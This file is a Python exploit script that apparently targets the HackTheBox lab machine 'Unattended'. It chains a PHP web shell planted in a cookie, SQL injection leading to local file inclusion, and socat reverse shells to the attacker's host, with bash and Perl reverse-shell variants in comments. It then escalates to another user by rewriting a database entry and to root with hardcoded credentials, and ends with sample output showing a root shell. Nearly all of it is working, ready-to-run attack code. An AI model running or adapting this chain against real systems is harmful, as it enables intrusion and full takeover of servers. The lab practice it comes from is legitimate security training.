#!/usr/bin/env python2
# Author: Alamot (Antonios Tsolis)
import re
import json
import time
import uuid
import fcntl
import base64
import urllib
import random
import requests
requests.packages.urllib3.disable_warnings()
import signal
signal.signal(signal.SIGINT, signal.SIG_DFL)
from pwn import *


def int2ipv6(addr):
    ''' Convert an integer to an IPv6 address '''
    addr = addr.decode('hex')
    addr = socket.inet_ntop(socket.AF_INET6, addr)
    return addr
    

def get_ip_address(ifname, ipv6=False):
    ''' Return the IP of an interface. '''
    if ipv6:
        with open("/proc/net/if_inet6" , "rt") as f:
            lines = f.readlines()
        for line in lines:
            data = line.split()
            address = data[0].strip()
            interface = data[5].strip()
            if interface == ifname and address[0:4] not in ["fe80", "fd00"]:
                return int2ipv6(address)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(),
                                0x8915,  # SIOCGIFADDR
                                struct.pack('256s', ifname[:15].encode()))[20:24])


IPV6 = True
INTERFACE = "tun0"
LHOST = get_ip_address(INTERFACE, ipv6=IPV6)
if IPV6:
    LPORT1 = "60000"
    LPORT2 = "60001"
else:
    LPORT1 = "443"
    LPORT2 = "80"
RURL = "https://www.nestedflanders.htb"


def send_payload():
    try:
        session = requests.Session()
        session.verify = False
        session.cookies['user_name'] = '<?php passthru($_REQUEST[cmd])?>'
        response = session.get(RURL + "/index.php")
        log.info("Injecting session via cookies: Status code " + str(response.status_code))
        if response.status_code != 200:
            exit()
        log.info("Cookies: " + str(session.cookies.get_dict()))
        phpsessid = session.cookies.get_dict()["PHPSESSID"].strip()
        if not phpsessid:
            exit()
        response = session.get(RURL + "/index.php?id=587%27%20UNION%20SELECT%20%22about%27%20UNION%20SELECT%20%27%2fvar%2flib%2fphp%2fsessions%2fsess_" + phpsessid + "%27%20LIMIT%201,1%20--%20%22%20LIMIT%201,1%20--%20&cmd=whoami")
        log.info("LFI via SQLI status code: " + str(response.status_code))
        if response.status_code != 200:
            exit()
        if "www-data" in response.content:
            log.success("Testing RCE: SUCCESS")
        else:
            log.error("Testing RCE: FAILED")
            exit()
            
        # Alternative payloads (they work too)
        # Payload (url-encoded): bash -c 'bash -i >& /dev/tcp/LHOST/LPORT1 0>&1' 
        # payload = "%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f" + LHOST + "%2f" + str(LPORT1) + "%20%30%3e%26%31%27"
        
        if IPV6:
            # Payload (url-encoded): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp6:[LHOST]:LPORT1
            payload = "%73%6f%63%61%74%20%65%78%65%63%3a%27%62%61%73%68%20%2d%6c%69%27%2c%70%74%79%2c%73%74%64%65%72%72%2c%73%65%74%73%69%64%2c%73%69%67%69%6e%74%2c%73%61%6e%65%20%74%63%706%3a%5b" + LHOST + "%5d%3a" + str(LPORT1)
        else:
            # Payload (url-encoded): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT1
            payload = "%73%6f%63%61%74%20%65%78%65%63%3a%27%62%61%73%68%20%2d%6c%69%27%2c%70%74%79%2c%73%74%64%65%72%72%2c%73%65%74%73%69%64%2c%73%69%67%69%6e%74%2c%73%61%6e%65%20%74%63%70%3a" + LHOST + "%3a" + str(LPORT1)
            
        response = session.get(RURL + "/index.php?id=587%27%20UNION%20SELECT%20%22about%27%20UNION%20SELECT%20%27%2fvar%2flib%2fphp%2fsessions%2fsess_" + phpsessid + "%27%20LIMIT%201,1%20--%20%22%20LIMIT%201,1%20--%20&cmd=" + payload)
    except requests.exceptions.RequestException as e:
        log.failure(str(e))
    finally:
        if session:
            session.close()
        log.success("Web session thread exited successfully.")



log.info("LHOST: " + LHOST)
print("\nWhat shell do you want?")
print("[1] www-data@unattended")
print("[2] guly@unattended")
print("[3] root@unattended")
print("[4] Exit\n")
response = None
while response not in ["1", "2", "3", "4"]:
    response = raw_input("Please enter a number 1-4: ").strip()
if response == "4":
    sys.exit()
    

try:
    threading.Thread(target=send_payload).start()
except Exception as e:
    log.error(str(e))
wwwdata_shell = listen(LPORT1, bindaddr=LHOST, timeout=20).wait_for_connection()

if response == "1":
    wwwdata_shell.interactive()
    wwwdata_shell.exit()

log.info("Writing perl script: /var/lib/php/sessions/a/checkrelease.pl")
wwwdata_shell.sendline("mkdir /var/lib/php/sessions/a")
# wwwdata_shell.sendline('printf \'#!/usr/bin/perl\nuse Socket;$i="' + LHOST + '";$p=' + str(LPORT2) + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\n\' > /var/lib/php/sessions/a/checkrelease.pl')
if IPV6:
    wwwdata_shell.sendline("printf '#!/usr/bin/perl\nexec(\"/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp6:[" + LHOST + "]:" + str(LPORT2) + "\");\n' > /var/lib/php/sessions/a/checkrelease.pl")
else:
    wwwdata_shell.sendline("printf '#!/usr/bin/perl\nexec(\"/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp:" + LHOST + ":" + str(LPORT2) + "\");\n' > /var/lib/php/sessions/a/checkrelease.pl")
log.info("Making script executable...")
wwwdata_shell.sendline("chmod +x /var/lib/php/sessions/a/checkrelease.pl")
log.info("Modifying db in order to execute our perl script... Now, please wait for a minute...")
wwwdata_shell.sendline("mysql -u nestedflanders -p'1036913cf7d38d4ea4f79b050f171e9fbf3f5e' -e 'update config set option_value=\"/var/lib/php/sessions/a/checkrelease.pl;\" where option_name=\"checkrelease\"' neddy;")


guly_shell = listen(LPORT2, bindaddr=LHOST, timeout=20).wait_for_connection()

if response == "2":
    guly_shell.interactive()
    guly_shell.exit()


if response == "3":
    guly_shell.sendline("su - root")
    guly_shell.recvuntil("Password:")
    guly_shell.sendline("132f93ab100671dcb263acaf5dc95d8260e8b7c6")
    guly_shell.interactive()
    guly_shell.exit()


'''
EXAMPLE OUTPUT:
$ python2 autopwn_unattended.py 
[*] LHOST: dead:beef:2::12d0

What shell do you want?
[1] www-data@unattended
[2] guly@unattended
[3] root@unattended
[4] Exit

Please enter a number 1-4: 3
[+] Trying to bind to dead:beef:2::12d0 on port 60000: Done
[+] Waiting for connections on dead:beef:2::12d0:60000: Got connection from dead:beef::250:56ff:feb9:880a on port 56102
[*] Injecting session via cookies: Status code 200
[*] Cookies: {'PHPSESSID': 'te3d32j80hdvrp8a63luu1cmk3', 'user_name': '<?php passthru($_REQUEST[cmd])?>'}
[*] LFI via SQLI status code: 200
[+] Testing RCE: SUCCESS
[*] Writing perl script: /var/lib/php/sessions/a/checkrelease.pl
[*] Making script executable...
[*] Modifying db in order to execute our perl script... Now, please wait for a minute...
[+] Trying to bind to dead:beef:2::12d0 on port 60001: Done
[+] Waiting for connections on dead:beef:2::12d0:60001: Got connection from dead:beef::250:56ff:feb9:880a on port 53594
[*] Switching to interactive mode
 
root@unattended:~# $
'''
